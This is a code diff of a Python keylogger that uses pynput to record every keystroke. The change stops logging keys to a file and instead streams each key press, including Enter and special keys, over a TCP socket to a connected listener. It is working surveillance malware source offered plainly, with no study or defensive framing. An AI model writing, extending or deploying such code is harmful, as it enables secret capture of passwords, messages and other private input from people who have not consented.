@@ -1,5 +1,7 @@
+import platform,os,socket
+from anyio import wait_socket_readable
+from pynput import keyboard
 from pynput.keyboard import Listener , Key
-import platform,os,sys,socket
 
 def C_server(ip,port):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -8,8 +10,8 @@ def C_server(ip,port):
         sock.bind((ip, port))
         print('host Succesfully binded !\n')# to be removed
     except Exception as err:
-        print ('Binding has failed. Error Code is : ' + str(err[0])+ ' Message : ' + err[1])# to be removed
-        sys.exit()
+        print ('Binding has failed. Error Code is : ',err)# to be removed
+        exit()
 
     return sock
 
@@ -30,26 +32,32 @@ def Sender(remote_host,data):
         remote_host.sendall(data.encode())
         return True
     except Exception as e : 
-        print(' Error While Sending : %s',e)# to be removed
-
-
-#f = open('sniff.txt','a')
-log = ""
+        print(f'Error While Sending :{e} ')# to be removed
 
 def on_press(key):
-    print("{0} pressed".format(key))
-
+    pr_key = str(key)
+    if type(key) != type(Key.esc):
+        print(f" pressed : {pr_key} \n")
+        Sender(remote_host,pr_key)
+    if key == Key.enter:
+        Sender(remote_host,' \n ')   
+        print(f" pressed : {pr_key} \n")
+    if type(key) == type(Key.esc): 
+        Sender(remote_host,' '+pr_key+' ')   
+        print(f" pressed : {pr_key} \n")
+         
+    return True    
 
 def on_release(key):
-    log=''
-    if key == Key.enter:
-        #f.writelines(log+'\n')
-        log=''
-    elif key == Key.esc:
-        #f.close() 
+    if key == Key.esc:
         exit()
-    else:
-        log+= str(key) + ' '
 
-with Listener(on_press=on_press , on_release=on_release) as listener:
-    listener.join()
+def wait_for_user_input():
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    listener.join() # wait till listener will stop
+    # other stuff 
+
+remote_host = conn_hundler(C_server('127.0.0.1',8083)) # to be used in on_press func
+
+print(wait_for_user_input())
